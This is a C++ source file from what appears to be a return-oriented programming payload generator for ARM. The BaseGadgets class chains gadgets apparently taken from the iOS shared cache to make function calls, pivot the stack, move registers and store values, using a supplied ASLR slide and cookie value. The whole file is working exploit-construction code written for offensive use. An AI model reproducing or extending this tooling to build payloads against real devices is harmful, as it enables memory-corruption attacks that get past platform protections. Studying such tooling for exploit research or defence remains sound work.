#include "BaseGadgets.h"

// ########################
// basegadgets.cpp
// ########################

//public:
  BaseGadgets::BaseGadgets(uint cookieValue, uint slideValue,
			  const char* fileName, uint maxSize) : 
    ROPGen(cookieValue, slideValue, fileName, maxSize) {
  }

//protected:

void BaseGadgets::nop() {
  addGadget(findGadget("pop {pc}"));
}

void BaseGadgets::callFunc(const char* symbol,
			   uint isThumb /* = TRUE*/) {
  uint addr;
  if (DEBUG_PAYLOAD)
	printf("%s: %s%s\n", 
		   __FUNCTION__, symbol,
		   (isThumb ? " (thumb)" : ""));

  addr = findGadget(symbol, FALSE) + isThumb;

  if (DEBUG_PAYLOAD)
  	printf("......0x%x  %s %s\n", 
  		   addr + getSlideValue(),
  		   symbol,
		   (isThumb ? "(thumb)" : ""));
  
  pop(4);
  // should handle when a byte is set to 0 with the slide (todo)
  addSymbol(addr, FALSE);
  addGadget(findGadget("blx r4 ; pop {r4, r7, pc}"));
  addBytes(DEFAULT_ADDED_BYTES, 8);
}

// stack pivot
void BaseGadgets::pivot_r(uint reg) {
  if (DEBUG_PAYLOAD)
	printf("%s%d\n", 
		   __FUNCTION__, reg);
  mov(4, reg);
  mov_sp_r4();
}

// to use at the start of the new payload after the stack pivot
// goes with pivot_r
void BaseGadgets::finish_pivot() {
  addBytes(DEFAULT_ADDED_BYTES, 8);
}

// used to pivot
void BaseGadgets::mov_sp_r4() {
  addGadget(findGadget("mov sp, r4 ; pop {r4, r7, pc}"));
}



// pop r0-8
void BaseGadgets::pop(uint reg) {
  std::stringstream	sstm;
  
  sstm << "pop {r" << reg << ", pc}";
  addGadget(findGadget(sstm.str()));
}

// mov
void BaseGadgets::mov(uint reg1, uint reg2) {
  static char priority[4] = {4, 5, 3, -1};
  uint blx_reg;
  std::stringstream	sstm_tmp;
  std::stringstream	sstm;
  uint gadget = 0;


  sstm << "mov r" << reg1;
  sstm << ", r" << reg2 << " ; blx r";

  // - could start at 8 or 6 but they are 
  // oftentime used to store other regs
  // - would like to avoid using r0-2
  for (uint i = 0; priority[i] != -1; i++) {
	blx_reg = priority[i];
	sstm_tmp << sstm.str();
	sstm_tmp << blx_reg;
	gadget = findGadget_fast(sstm_tmp.str());
	if (gadget) {
	  // clears available blx register (tofix)
	  pop(blx_reg);
	  nop();
	  addGadget(gadget);
	  return;
	}
	sstm_tmp.str("");
	sstm_tmp.clear();
  }
  exit(printf("Error in mov(). Cannot find a "
	      "gadget for {mov r%d, r%d}\n", 
	      reg1, reg2));
}

// add
void BaseGadgets::add_r4_sp_r4() {
  pop(2);
  nop();
  addGadget(findGadget("add r4, sp, r4 ; blx r2"));
}

// str
void BaseGadgets::str_r1__r4() {
  addGadget(findGadget("str r1, [r4] ; pop {r4, r7, pc}"));
  addBytes(DEFAULT_ADDED_BYTES, 8);
}

// lsrs / lsls

void BaseGadgets::lsrs_r0_r0_8() {
  addGadget(findGadget("lsrs r0, r0, #8 ; pop {r7, pc}"));
  addBytes();
  
}
void BaseGadgets::lsrs_r0_r0_24() {
  addGadget(findGadget("lsrs r0, r0, #0x18 ; pop {r7, pc}"));
  addBytes();
}
void BaseGadgets::lsrs_r0_r0_16() {
  addGadget(findGadget("lsrs r0, r0, #0x10 ; pop {r7, pc}"));
  addBytes();
}
void BaseGadgets::lsls_r1_r1_8() {
  // clears r3 (tofix)
  pop(3);
  nop();
  addGadget(findGadget("lsls r1, r1, #8 ; blx r3"));
}

void BaseGadgets::lsrs_r1_r1_8() {
  // clears r4 (tofix)
  addGadget(findGadget("lsrs r1, r1, #8 ; pop {r4, r7, pc}"));
  addBytes(DEFAULT_ADDED_BYTES, 8);
}
void BaseGadgets::lsrs_r1_r1_24() {
  // clears r3 (tofix)
  // NOT present on iOS 5 cache
  pop(3);
  nop();
  addGadget(findGadget("lsrs r1, r1, #0x18 ; blx r3"));
}

void BaseGadgets::lsrs_r1_r1_28() {
  addGadget(findGadget("lsrs r1, r1, #0x1c ; pop {r7, pc}"));
  addBytes();
}

void BaseGadgets::ls_r_8(char direction, uint reg) {
  // clears r3 (tofix)
  std::stringstream	sstm;
  pop(3);
  nop();
  sstm << "ls" << direction << "s r" << reg;
  sstm << ", r" << reg << ", #8 ; blx r3";
  addGadget(findGadget(sstm.str()));
}


// sub sp
void BaseGadgets::sub_sp() {
  pop(3);
  nop();
  addGadget(findGadget("sub sp, #0x100 ; blx r3"));
}
